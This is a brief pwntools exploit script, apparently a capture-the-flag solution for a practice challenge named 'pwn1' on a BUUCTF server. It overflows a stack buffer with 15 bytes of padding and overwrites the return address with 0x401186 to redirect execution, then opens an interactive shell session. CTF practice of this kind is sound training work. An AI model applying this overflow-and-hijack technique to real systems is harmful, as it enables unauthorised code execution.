from pwn import *
context.log_level='debug'

# io = process('./pwn1')
io = remote('node4.buuoj.cn', 27534)

io.sendline(cyclic(15) + p64(0x401186))

io.interactive()